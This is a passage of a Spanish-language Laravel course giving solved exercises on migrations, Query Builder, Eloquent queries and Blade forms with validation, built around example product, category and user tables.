Schema::create('categorias', function (Blueprint $table) {\n        $table-&gt;id();\n        $table-&gt;string('nombre');\n        $table-&gt;timestamps();\n    });\n}\n\npublic function down(){\n    Schema::dropIfExists('categorias');\n}\n</code></pre> <p>Como la tabla productos ya la tenemos creada, hacemos una migraci\u00f3n que a\u00f1ada el campo necesario con la clave for\u00e1nea a la tabla categorias.</p> <p>Ejecuta: <code>php artisan make:migration add_categoria_id_to_productos_table</code></p> <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\npublic function up(){\n    Schema::table('productos', function (Blueprint $table) {\n        $table-&gt;foreignId('categoria_id')-&gt;constrained()-&gt;onDelete('cascade');\n        // $table-&gt;foreignId('categoria_id')-&gt;constrained([table: 'categorias', indexName: 'id'])-&gt;onDelete('cascade');\n    });\n}\n\npublic function down(){\n    Schema::table('productos', function (Blueprint $table) {\n        $table-&gt;dropColumn('categoria_id');\n    });\n}\n</code></pre> <p>Ejecuta: <code>php artisan migrate</code></p> <ol> <li>Modificar una tabla para a\u00f1adir \u00edndices: A\u00f1ade un \u00edndice \u00fanico a la columna nombre de la tabla categorias.</li> </ol> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:migration add_unique_to_nombre_in_categorias_table</code></p> <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\npublic function up(){\n    Schema::table('categorias', function (Blueprint $table) {\n        $table-&gt;unique('nombre');\n    });\n}\n\npublic function down(){\n    Schema::table('categorias', function (Blueprint $table) {\n        $table-&gt;dropUnique('categorias_nombre_unique'); // table_column_unique\n    });\n}\n</code></pre> <p>Ejecuta: <code>php artisan migrate</code></p> <ol> <li>Eliminar una columna de una tabla: Elimina la columna descripcion de la tabla productos*.</li> </ol> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:migration drop_descripcion_from_productos_table</code></p> <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\npublic function up(){\n    Schema::table('productos', function (Blueprint $table) {\n        $table-&gt;dropColumn('descripcion');\n    });\n}\n\npublic function down(){\n    Schema::table('productos', function (Blueprint $table) {\n        $table-&gt;text('descripcion')-&gt;nullable();\n    });\n}\n</code></pre> <p>Ejecuta: <code>php artisan migrate</code></p> <ol> <li>Renombrar una tabla: Cambia el nombre de la tabla productos a articulos.</li> </ol> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:migration rename_productos_to_articulos</code></p> <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\npublic function up(){\n    Schema::rename('productos', 'articulos');\n}\n\npublic function down(){\n    Schema::rename('articulos', 'productos');\n}\n</code></pre> <p>Ejecuta: <code>php artisan migrate</code></p> <ol> <li>Usar valores predeterminados en una columna: A\u00f1ade una columna stock con un valor por defecto de 0 a la tabla productos.</li> </ol> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:migration add_stock_to_productos_table</code></p> <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\npublic function up(){\n    Schema::table('productos', function (Blueprint $table) {\n        $table-&gt;integer('stock')-&gt;default(0);\n    });\n}\n\npublic function down(){\n    Schema::table('productos', function (Blueprint $table) {\n        $table-&gt;dropColumn('stock');\n    });\n}\n</code></pre> <p>Ejecuta: <code>php artisan migrate</code></p> <ol> <li>Crear tabla con datos iniciales: Crear tabla usuarios con los siguientes campos:</li> </ol> <ul> <li>id</li> <li>nombre (string)</li> <li>email (string, \u00fanico)</li> <li>password (string)</li> <li>created_at y updated_at</li> </ul> <p>Adem\u00e1s, rell\u00e9nala con datos iniciales mediante el seeder DatabaseSeeder (opcional, se ve en el tema siguiente).</p> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:migration create_usuarios_table</code></p> <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\npublic function up(){\n    Schema::create('usuarios', function (Blueprint $table) {\n        $table-&gt;id();\n        $table-&gt;string('nombre');\n        $table-&gt;string('email')-&gt;unique();\n        $table-&gt;string('password');\n        $table-&gt;timestamps();\n    });\n}\n\npublic function down(){\n    Schema::dropIfExists('usuarios');\n}\n</code></pre> <p>Inserta en la funci\u00f3n <code>run</code> de <code>database/seeders/DatabaseSeeder.php</code>:</p> <pre><code>&lt;?php\nDB::table('usuarios')-&gt;insert([\n    ['nombre' =&gt; 'Juan', 'email' =&gt; 'juan@example.com', 'password' =&gt; bcrypt('123456')],\n    ['nombre' =&gt; 'Ana', 'email' =&gt; 'ana@example.com', 'password' =&gt; bcrypt('123456')],\n]);\n</code></pre> <p>Ejecuta: <code>php artisan migrate --seed</code></p> <ol> <li>Borrar y recrear la BDD: Utiliza los comandos de Artisan necesarios para eliminar y volver a crear todas las tablas de la BDD.</li> </ol> Soluci\u00f3n <p>Ejecuta: <code>php artisan migrate:fresh</code></p> <ol> <li>Ejercicio completo: Crear un sistema de reservas: Crea las siguientes tablas para un sistema de reservas:</li> </ol> <ul> <li>usuarios (id, nombre, email, password)</li> <li>habitaciones (id, nombre, capacidad)</li> <li>reservas (id, usuario_id, habitacion_id, fecha_reserva)</li> </ul> <p>Incluye claves for\u00e1neas, valores predeterminados y relaci\u00f3n de \"cascade delete\".</p> Soluci\u00f3n <p>Ejecuta: ``</p> <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\n</code></pre> <p>Ejecuta: <code>php artisan migrate</code></p>"},{"location":"08actividadesResueltas.html#query-builder","title":"Query Builder","text":"<p>En este apartado vas a trabajar haciendo consultas directamente sobre la BDD mediante Query Builder. </p> <p>Para probar que funciona, se recomienda meter el c\u00f3digo de cada ejercicio en una funci\u00f3n independiente del controlador que se llamar\u00e1 con una ruta que te inventes (por ejemplo: <code>localhost/ejercicio820</code>). Nota: Dicha funci\u00f3n del controlador deber\u00eda llamar a la funci\u00f3n correspondiente del modelo y ah\u00ed es donde insertar\u00edas el c\u00f3digo de Query Builder, pero por simplificar, puedes trabajar \u00fanicamente sobre el controlador.</p> <p>No olvides: <code>use Illuminate\\Support\\Facades\\DB;</code> para que importe la BD.</p> <p>Para todos los ejercicios se va a utilizar la tabla productos. Si no la tienes, cr\u00e9ala mediante una migraci\u00f3n con los campos id, nombre, precio, descripcion. O si la renombraste a articulos, vuelve a crear una migraci\u00f3n en la que le cambies el nombre.</p> <ol> <li>Insertar registros: Inserta un nuevo producto en la tabla. Puedes crear una ruta a la que se le pasen los par\u00e1metros nombre, precio y descripcion.</li> </ol> Soluci\u00f3n <p>Las variables $nombre, $precio y $descripcion se han pasado por la ruta.</p> <pre><code>&lt;?php\nDB::table('productos')-&gt;insert([\n    'nombre' =&gt; $nombre,\n    'precio' =&gt; $precio,\n    'descripcion' =&gt; $descripcion,\n    'created_at' =&gt; now(),\n    'updated_at' =&gt; now(),\n]);\n</code></pre> <ol> <li>Actualizar registros: Actualiza el nombre de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> </ol> Soluci\u00f3n <p>Las variables $id y $nombre se han pasado por la ruta.</p> <pre><code>&lt;?php\nDB::table('productos')\n    -&gt;where('id', $id)\n    -&gt;update(['nombre' =&gt; $nombre]);\n</code></pre> <ol> <li>Actualizar registros: Actualiza el precio de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> </ol> Soluci\u00f3n <p>Las variables $id y $precio se han pasado por la ruta.</p> <pre><code>&lt;?php\nDB::table('productos')\n    -&gt;where('id', $id)\n    -&gt;update(['precio' =&gt; $precio]);\n</code></pre> <ol> <li>Actualizar registros: Actualiza la descripcion de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> </ol> Soluci\u00f3n <p>Las variables $id y $descripcion se han pasado por la ruta.</p> <pre><code>&lt;?php\nDB::table('productos')\n    -&gt;where('id', $id)\n    -&gt;update(['descripcion' =&gt; $descripcion]);\n</code></pre> <ol> <li>Eliminar registros: Elimina un producto seg\u00fan el id pasado por la ruta.</li> </ol> Soluci\u00f3n <p>Las variable $id se ha pasado por la ruta.</p> <pre><code>&lt;?php\nDB::table('productos')-&gt;where('id', $id)-&gt;delete();\n</code></pre> <ol> <li>Eliminar registros: Elimina los productos cuyo precio sea inferior a 20.</li> </ol> Soluci\u00f3n <p>Las variables $id y $precio se han pasado por la ruta.</p> <pre><code>&lt;?php\nDB::table('productos')-&gt;where('precio', '&lt;', 20)-&gt;delete();\n</code></pre> <ol> <li>Obtener todos los registros: Obt\u00e9n todos los registros de la tabla productos. </li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = DB::table('productos')-&gt;get();\n</code></pre> <ol> <li>Obtener registro por id: Obt\u00e9n un registro por su id pasado por la ruta.</li> </ol> Soluci\u00f3n <p>Las variable $id se ha pasado por la ruta.</p> <pre><code>&lt;?php\n$producto = DB::table('productos')-&gt;find($id);\n//$producto = DB::table('productos')-&gt;where('id', $id)-&gt;get();\n</code></pre> <ol> <li>Seleccionar columnas espec\u00edficas: Obt\u00e9n solo las columnas nombre y precio de todos los registros de productos.</li> </ol> Soluci\u00f3n <p>Contenido del archivo de la migraci\u00f3n:</p> <pre><code>&lt;?php\n$productos = DB::table('productos')-&gt;select('nombre', 'precio')-&gt;get();\n</code></pre> <ol> <li>Filtrar registros con where: Obt\u00e9n los productos cuyo precio sea mayor a 50.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = DB::table('productos')-&gt;where('precio', '&gt;', 50)-&gt;get();\n</code></pre> <ol> <li>Filtrar registros con where: Obt\u00e9n productos cuyo precio est\u00e9 entre 50 y 100, y cuya descripci\u00f3n no sea nula.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = DB::table('productos')\n    -&gt;whereBetween('precio', [50, 100])\n    -&gt;whereNotNull('descripcion')\n    -&gt;get();\n</code></pre> <ol> <li>Ordenar resultados: Ordena los productos por precio de forma descendente.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = DB::table('productos')-&gt;orderBy('precio', 'desc')-&gt;get();\n</code></pre> <ol> <li>Paginar resultados: Pagina los productos mostrando 5 por p\u00e1gina.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = DB::table('productos')-&gt;paginate(5);\n</code></pre> <ol> <li>Contar registros: Cuenta cu\u00e1ntos productos tienen un precio mayor a 100.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productosMayor100 = DB::table('productos')-&gt;where('precio', '&gt;', 100)-&gt;count();\n</code></pre> <ol> <li>Obtener el registro m\u00e1s caro: Obt\u00e9n el producto con el precio m\u00e1s alto.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productoMasCaro = DB::table('productos')-&gt;orderBy('precio', 'desc')-&gt;first();\n</code></pre> <ol> <li>Ejecutar consultas crudas: Usa una consulta SQL \"cruda\" para obtener productos cuyo nombre contenga la palabra \"Premium\".</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = DB::select('SELECT * FROM productos WHERE nombre LIKE ?', ['%Premium%']);\n</code></pre> <ol> <li>Consulta con uniones (join): Crea la migraci\u00f3n corresponediente para crear la tabla categorias (id, nombre) y hacer que cada producto pertenezca a una categor\u00eda. Una vez hecho, mediante Query Builder obt\u00e9n el nombre del producto junto al nombre de su categor\u00eda.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = DB::table('productos')\n    -&gt;join('categorias', 'productos.categoria_id', '=', 'categorias.id')\n    -&gt;select('productos.nombre as producto', 'categorias.nombre as categoria')\n    -&gt;get();\n</code></pre> <ol> <li>Agrupar resultados con groupBy y having: Agrupa los productos por categor\u00eda y calcula el precio promedio por categor\u00eda, mostrando solo las categor\u00edas con un promedio mayor a 50.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$categoriasPromedioMayor50 = DB::table('productos')\n    -&gt;select(DB::raw('categoria, AVG(precio) as promedio_precio'))\n    -&gt;groupBy('categoria')\n    -&gt;having('promedio_precio', '&gt;', 50)\n    -&gt;get();\n</code></pre> <ol> <li>Consultas anidadas: Encuentra el producto m\u00e1s caro dentro de cada categor\u00eda.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productosMasCaros = DB::table('productos as p1')\n    -&gt;select('p1.*')\n    -&gt;whereRaw('precio = (SELECT MAX(precio) FROM productos WHERE categoria_id = p1.categoria_id)')\n    -&gt;get();\n</code></pre> <ol> <li>Ejercicio completo: CRUD con Query Builder Implementa un CRUD completo para la tabla clientes utilizando Query Builder:</li> </ol> <ul> <li>C: Inserta nuevos clientes.</li> <li>R: Obt\u00e9n todos los clientes y filtra por email.</li> <li>U: Actualiza el nombre de un cliente espec\u00edfico.</li> <li>D: Elimina clientes con un email espec\u00edfico.</li> </ul>"},{"location":"08actividadesResueltas.html#eloquent-modelos","title":"Eloquent: Modelos","text":"<p>Antes has trabajado lanzando consultas mediante Query Builder directamente sobre la tabla productos. Ahora har\u00e1s consultas parecidas, pero SIEMPRE desde el modelo mediante Eloquent.</p> <p>Para probar que funciona, se recomienda meter el c\u00f3digo de cada ejercicio en una funci\u00f3n independiente del controlador que se llamar\u00e1 con una ruta que te inventes (por ejemplo: <code>localhost/ejercicio841</code>).</p> <ol> <li>Crear modelo y tabla asociada: Crea el modelo Producto con su tabla asociada productos (ya la tienes del apartado anterior).</li> </ol> Soluci\u00f3n <p>Recuerda que con el flag -m crea la migraci\u00f3n asociada.</p> <p>Ejecuta: <code>php artisan make:model Producto</code></p> <ol> <li>Inserta productos: Inserta un producto con los campos nombre, precio y descripcion pasados mediante par\u00e1metro por la ruta.</li> </ol> Soluci\u00f3n <p>En una funci\u00f3n del controlador:</p> <pre><code>&lt;?php\nuse App\\Models\\Producto;\n\n// El siguiente c\u00f3digo en una funci\u00f3n del controlador a la que se llega mediante la ruta\n// Al utilizar 'create' no olvides definir en el modelo 'Producto':\n// protected $fillable = ['titulo', 'contenido', 'prioridad'];\nProducto::create([\n    'nombre' =&gt; $nombre,\n    'precio' =&gt; $precio,\n    'descripcion' =&gt; $descripcion,\n]);\n</code></pre> <ol> <li>Inserta productos: Inserta un producto con los campos nombre, precio y descripcion pasados mediante par\u00e1metro por la ruta, pero validando previamente que su precio sea mayor que 50 para insertarlo realmente.</li> </ol> Soluci\u00f3n <p>En el controlador:</p> <pre><code>&lt;?php\nif ($precio &gt; 50) { \n    $producto = new Producto();\n    $producto-&gt;nombre = $nombre;\n    $producto-&gt;precio = $precio;\n    $producto-&gt;descripcion = $descripcion;\n    $producto-&gt;save();\n    echo \"Producto guardado correctamente.\";\n} else {\n    echo \"El precio del producto es demasiado bajo.\";\n}\n</code></pre> <ol> <li>Actualizar productos: Actualiza el nombre de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$producto = Producto::find($id);\n$producto-&gt;nombre = $nombre;\n$producto-&gt;save();\n</code></pre> <ol> <li>Actualizar productos: Actualiza el precio de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$producto = Producto::find($id);\n$producto-&gt;precio = $precio;\n$producto-&gt;save();\n</code></pre> <ol> <li>Actualizar productos: Actualiza la descripcion de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$producto = Producto::find($id);\n$producto-&gt;descripcion = $descripcion;\n$producto-&gt;save();\n</code></pre> <ol> <li>Actualizar m\u00faltiples productos: Actualiza todos los productos cuyo precio sea menor que 50, cambiando su descripcion a 'producto econ\u00f3mico'.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\nProducto::where('precio', '&lt;', 50)-&gt;update(['descripcion' =&gt; 'Producto econ\u00f3mico']);\n</code></pre> <ol> <li>Eliminar productos: Elimina un producto seg\u00fan el id pasado por la ruta.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\nProducto::destroy($id);\n// $producto = Producto::find($id);\n// $producto-&gt;delete();\n</code></pre> <ol> <li>Eliminar productos: Elimina los productos cuyo precio sea inferior a 20.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\nProducto::where('precio', '&lt;', 20)-&gt;delete();\n</code></pre> <ol> <li>Obtener todos los productos: Obt\u00e9n todos los productos de la tabla productos.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = Producto::all();\n</code></pre> <ol> <li>Obtener producto por id: Obt\u00e9n un producto por su id pasado por la ruta.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$producto = Producto::find($id);\n</code></pre> <ol> <li>Filtrar con where: Obt\u00e9n los productos cuyo precio sea mayor a 50.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = Producto::where('precio', '&gt;', 50)-&gt;get();\n</code></pre> <ol> <li>Contar el n\u00famero de productos: Cuenta cu\u00e1ntos productos tienen un precio mayor a 50.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$cantidadProductosMayor50 = Producto::where('precio', '&gt;', 50)-&gt;count();\n</code></pre> <ol> <li>Ordenar resultados: Ordena los productos por precio de manera descendente.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = Producto::orderBy('precio', 'desc')-&gt;get();\n</code></pre> <ol> <li>Usar el m\u00e9todo pluck para obtener solo los nombres de los productos.</li> </ol> Soluci\u00f3n <p>El m\u00e9todo <code>pluck</code> recupera todos los valores para una clave dada de un array o, en este caso, los valores de una columna de una tabla.</p> <pre><code>&lt;?php\n$nombres = Producto::pluck('nombre');\n</code></pre> <ol> <li>Usar el m\u00e9todo firstOrCreate para buscar un producto por su nombre, y si no existe, crea un nuevo producto.</li> </ol> Soluci\u00f3n <p>El m\u00e9todo <code>firstOrCreate</code> busca un producto por su nombre, y si no existe, lo crea.</p> <pre><code>&lt;?php\n$producto = Producto::firstOrCreate(\n    ['nombre' =&gt; $nombre],\n    ['precio' =&gt; 80.00, 'descripcion' =&gt; 'Nuevo producto']\n);\n</code></pre> <ol> <li>Usar el m\u00e9todo updateOrCreate para actualizar un producto existente por su nombre, o crear uno nuevo si no existe.</li> </ol> Soluci\u00f3n <p>El m\u00e9todo <code>updateOrCreate</code> busca un producto por su nombre, y si no existe, lo crea.</p> <pre><code>&lt;?php\n$producto = Producto::updateOrCreate(\n    ['nombre' =&gt; $nombre],\n    ['precio' =&gt; 120.00, 'descripcion' =&gt; 'Producto Y actualizado']\n);\n</code></pre> <ol> <li>Limitar resultados: Usa el m\u00e9todo take para obtener solo los 5 primeros productos.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = Producto::take(5)-&gt;get();\n</code></pre> <ol> <li>Paginaci\u00f3n de resultados: P\u00e1gina los productos mostrando 5 por p\u00e1gina.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = Producto::paginate(5);\n</code></pre> <ol> <li>Consulta con where y orWhere: Recupera todos los productos cuyo precio sea mayor que 100 o cuyo nombre contenga la palabra \"Premium\".</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n$productos = Producto::where('precio', '&gt;', 100)\n    -&gt;orWhere('nombre', 'LIKE', '%Premium%')\n    -&gt;get();\n</code></pre> <ol> <li>Ejercicio completo: CRUD con Eloquent Implementa un CRUD completo mediante Eloquent para el modelo Cliente que crees asociado a la tabla clientes:</li> </ol> <ul> <li>C: Crea nuevos clientes.</li> <li>R: Obt\u00e9n todos los clientes y filtra por email.</li> <li>U: Actualiza el nombre de un cliente espec\u00edfico.</li> <li>D: Elimina clientes con un email espec\u00edfico.</li> </ul>"},{"location":"08actividadesResueltas.html#formularios","title":"Formularios","text":"<p>En los siguientes ejercicios de formularios vas a realizar un CRUD de productos continuando lo que hiciste en el apartado anterior. Si tienes las clases de <code>Productos</code> (Modelo y Controlador) muy extensas y prefieres empezar de 0, puedes hacer los ejercicios siguientes para gestionar usuarios en vez de productos. Tendr\u00edas que crear previamente el modelo Usuario con su migraci\u00f3n para crear su tabla asociada usuarios con los campos t\u00edpicos: nombre, email, password y tambi\u00e9n el controlador UsuarioController.</p> <p>En cualquier caso, recuerda nombrar correctamente las rutas, funciones en controladores y vistas siguiendo las recomendaciones de Laravel.</p> <ol> <li>Formulario para crear productos: Crea un formulario en el que se pidan los campos necesarios para crear un producto. Se acceder\u00e1 mediante <code>GET /productos/create</code> y su vista estar\u00e1 en <code>productos/create.blade.php</code>. El formulario se procesar\u00e1 mediante <code>POST /productos/store</code> redirigiendo finalmente a <code>GET /productos</code> donde se muestra el listado de productos.</li> </ol> Soluci\u00f3n <p>Formulario en <code>productos/create.blade.php</code>:</p> <pre><code>&lt;form action=\"{{ route('productos.store') }}\" method=\"POST\"&gt;\n    @csrf\n    &lt;p&gt;\n        &lt;label for=\"nombre\"&gt;Nombre:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"nombre\" name=\"nombre\" required&gt;\n    &lt;/p&gt;\n    &lt;p&gt;\n        &lt;label for=\"descripcion\"&gt;Descripcion:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"descripcion\" name=\"descripcion\" required&gt;\n    &lt;/p&gt;\n    &lt;p&gt;\n        &lt;label for=\"precio\"&gt;Precio:&lt;/label&gt;\n        &lt;input type=\"number\" id=\"precio\" name=\"precio\" required&gt;\n    &lt;/p&gt;\n    &lt;p&gt;&lt;button type=\"submit\"&gt;Crear Producto&lt;/button&gt;&lt;/p&gt;\n&lt;/form&gt;\n</code></pre> <p>Funci\u00f3n en <code>ProductoController.php</code> para almacenar el producto en la BDD:</p> <pre><code>&lt;?php\nuse App\\Models\\Producto;\nuse Illuminate\\Http\\Request;\n\nclass ProductoController extends Controller\n{\n    public function store(Request $request)\n    {\n        $validated = $request-&gt;validate([\n            'nombre' =&gt; 'required|string|max:255',\n            'descripcion' =&gt; 'required|string|min:20',\n            'precio' =&gt; 'required|decimal:2|min:0',\n        ]);\n\n        // Al utilizar 'create' no olvides definir en el modelo 'Producto':\n        // protected $fillable = ['titulo', 'contenido', 'prioridad'];\n        $producto = Producto::create([\n            'nombre' =&gt; $validated['nombre'],\n            'descripcion' =&gt; $validated['descripcion'],\n            'precio' =&gt; $validated['precio'],\n        ]);\n\n        // Producto::create($validated);\n\n        return redirect()-&gt;route('productos.index');\n    }\n}\n</code></pre> <ol> <li>Formulario para editar productos: Crea el formulario de edici\u00f3n de un producto. Se acceder\u00e1 mediante <code>GET /productos/{id}/edit</code> y su vista estar\u00e1 en <code>productos/edit.blade.php</code>. El formulario se procesar\u00e1 mediante <code>PUT /productos/update</code> redirigiendo finalmente a <code>GET /productos</code> donde se muestra el listado de productos.</li> </ol> Soluci\u00f3n <p>Formulario en <code>productos/edit.blade.php</code>:</p> <pre><code>&lt;form action=\"{{ route('productos.update', $producto-&gt;id) }}\" method=\"POST\"&gt;\n    @method('PUT') \n    @csrf\n    &lt;p&gt;\n        &lt;label for=\"nombre\"&gt;Nombre:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"nombre\" name=\"nombre\" value=\"{{ $producto-&gt;nombre }}\" required&gt;\n    &lt;/p&gt;\n    &lt;p&gt;\n        &lt;label for=\"descripcion\"&gt;Descripcion:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"descripcion\" name=\"descripcion\" value=\"{{ $producto-&gt;descripcion }}\" required&gt;\n    &lt;/p&gt;\n    &lt;p&gt;\n        &lt;label for=\"precio\"&gt;Precio:&lt;/label&gt;\n        &lt;input type=\"number\" id=\"precio\" name=\"precio\" value=\"{{ $producto-&gt;precio }}\" required&gt;\n    &lt;/p&gt;\n    &lt;p&gt;&lt;button type=\"submit\"&gt;Actualizar Producto&lt;/button&gt;&lt;/p&gt;\n&lt;/form&gt;\n</code></pre> <p>Funci\u00f3n en <code>ProductoController.php</code> para actualizar el producto en la BDD:</p> <pre><code>&lt;?php\nuse App\\Models\\Producto;\nuse Illuminate\\Http\\Request;\n\nclass ProductoController extends Controller\n{\n    public function update(Request $request, $id)\n    {\n        $producto = Producto::findOrFail($id);\n\n        $validated = $request-&gt;validate([\n            'nombre' =&gt; 'required|string|max:255',\n            'descripcion' =&gt; 'required|string|min:20',\n            'precio' =&gt; 'required|decimal:2|min:0',\n        ]);\n\n        $producto-&gt;nombre = $validated['nombre'];\n        $producto-&gt;descripcion = $validated['descripcion'];\n        $producto-&gt;precio = $validated['precio'];\n\n        $producto-&gt;save();            \n\n        return redirect()-&gt;route('productos.index');\n    }\n}\n</code></pre> <ol> <li>Validaci\u00f3n de datos: En las funciones correspondientes del controlador donde se reciben los datos de los formularios anteriores, a\u00f1ade validaci\u00f3n a cada uno de los campos:</li> </ol> <ul> <li>nombre: Requerido, tipo cadena y valor m\u00e1ximo 255.</li> <li>descripcion: Tipo cadena y valor m\u00e1ximo 1000.</li> <li>precio: Requerido, tipo num\u00e9rico con 2 decimales y valor m\u00ednimo 0.</li> </ul> <p>En las vistas de los 2 formularios a\u00f1ade mensajes de error en el caso de que los campos no pasen la validaci\u00f3n y asigna mediante old el valor antiguo del campo para que el usuario no tenga que volver a escribirlo.</p> Soluci\u00f3n <p>Validaci\u00f3n en el controlador ya a\u00f1adida en las soluciones anteriores.</p> <p>En las vistas:</p> <p>Formulario en <code>productos/create.blade.php</code> con mensajes de error y valores antiguos de los campos:</p> <pre><code>&lt;form action=\"{{ route('productos.store') }}\" method=\"POST\"&gt;\n    @csrf\n    &lt;p&gt;\n        &lt;label for=\"nombre\"&gt;Nombre:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"nombre\" name=\"nombre\" value=\"{{ old('nombre') }}\" required&gt;\n    &lt;/p&gt;\n    @error('nombre') &lt;div class=\"error\"&gt;{{ $message }}&lt;/div&gt;@enderror\n    &lt;p&gt;\n        &lt;label for=\"descripcion\"&gt;Descripcion:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"descripcion\" name=\"descripcion\" value=\"{{ old('descripcion') }}\" required&gt;\n    &lt;/p&gt;\n    @error('descripcion') &lt;div class=\"error\"&gt;{{ $message }}&lt;/div&gt;@enderror\n    &lt;p&gt;\n        &lt;label for=\"precio\"&gt;Precio:&lt;/label&gt;\n        &lt;input type=\"number\" id=\"precio\" name=\"precio\" value=\"{{ old('precio') }}\" required&gt;\n    &lt;/p&gt;\n    @error('precio') &lt;div class=\"error\"&gt;{{ $message }}&lt;/div&gt;@enderror\n    &lt;p&gt;&lt;button type=\"submit\"&gt;Crear Producto&lt;/button&gt;&lt;/p&gt;\n&lt;/form&gt;\n</code></pre> <p>Formulario en <code>productos/edit.blade.php</code> con mensajes de error y valores antiguos de los campos:</p> <pre><code>&lt;form action=\"{{ route('productos.update', $producto-&gt;id) }}\" method=\"POST\"&gt;\n    @method('PUT')\n    @csrf\n    &lt;p&gt;\n        &lt;label for=\"nombre\"&gt;Nombre:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"nombre\" name=\"nombre\" value=\"{{ old('nombre', $producto-&gt;nombre) }}\" required&gt;\n    &lt;/p&gt;\n    @error('nombre') &lt;div class=\"error\"&gt;{{ $message }}&lt;/div&gt;@enderror\n    &lt;p&gt;\n        &lt;label for=\"descripcion\"&gt;Descripcion:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"descripcion\" name=\"descripcion\" value=\"{{ old('descripcion', $producto-&gt;descripcion) }}\" required&gt;\n    &lt;/p&gt;\n    @error('descripcion') &lt;div class=\"error\"&gt;{{ $message }}&lt;/div&gt;@enderror\n    &lt;p&gt;\n        &lt;label for=\"precio\"&gt;Precio:&lt;/label&gt;\n        &lt;input type=\"number\" id=\"precio\" name=\"precio\" value=\"{{ old('precio', $producto-&gt;precio) }}\" required&gt;\n    &lt;/p&gt;\n    @error('precio') &lt;div class=\"error\"&gt;{{ $message }}&lt;/div&gt;@enderror\n    &lt;p&gt;&lt;button type=\"submit\"&gt;Actualizar Producto&lt;/button&gt;&lt;/p&gt;\n&lt;/form&gt;\n</code></pre> <ol> <li>Formulario de confirmaci\u00f3n para eliminar productos: Crear un formulario de confirmaci\u00f3n para eliminar un recurso. S\u00f3lo contendr\u00e1 un mensaje de \"\u00bfEst\u00e1s seguro que quieres eliminar este producto?\" y un bot\u00f3n para proceder a eliminarlo. Se acceder\u00e1 mediante <code>GET /productos/{id}/destroy</code> y su vista estar\u00e1 en <code>productos/destroy.blade.php</code>. El formulario se procesar\u00e1 mediante <code>DELETE /productos/{id}</code> redirigiendo finalmente a <code>GET /productos</code> donde se muestra el listado de productos.</li> </ol> Soluci\u00f3n <p>Formulario en <code>productos/destroy.blade.php</code> para confirmar eliminaci\u00f3n:</p> <pre><code>&lt;form action=\"{{ route('productos.destroy', $producto-&gt;id) }}\" method=\"POST\"&gt;\n    @method('DELETE')\n    @csrf\n    &lt;p&gt;\u00bfEst\u00e1s seguro de que deseas eliminar este producto?&lt;/p&gt;\n    &lt;button type=\"submit\"&gt;Eliminar Producto&lt;/button&gt;\n&lt;/form&gt;\n</code></pre> <p>Funci\u00f3n en <code>ProductoController.php</code> para eliminar el producto en la BDD:</p> <pre><code>&lt;?php\npublic function destroy($id)\n{\n    $producto = Producto::findOrFail($id);\n    $producto-&gt;delete();\n\n    return redirect()-&gt;route('productos.index');\n}\n</code></pre> <ol> <li>Ejercicio completo: CRUD con formularios: Contin\u00faa el CRUD del apartado anterior para a\u00f1adir funciones a la gesti\u00f3n de clientes:</li> </ol> <ul> <li>C: Crea nuevos clientes.</li> <li>R: Obt\u00e9n todos los clientes y filtra por diferentes cmapos.</li> <li>U: Actualiza los campos de un cliente espec\u00edfico.</li> <li>D: Elimina clientes.</li> </ul>"},{"location":"08laravelDatos.html","title":"08laravelDatos","text":""},{"location":"08laravelDatos.html#gestion-de-datos-en-laravel","title":"Gesti\u00f3n de datos en Laravel","text":"<p>Duraci\u00f3n estimada: 20 sesiones</p>"},{"location":"08laravelDatos.html#81-introduccion","title":"8.1 Introducci\u00f3n","text":"<p>Laravel es un framework PHP 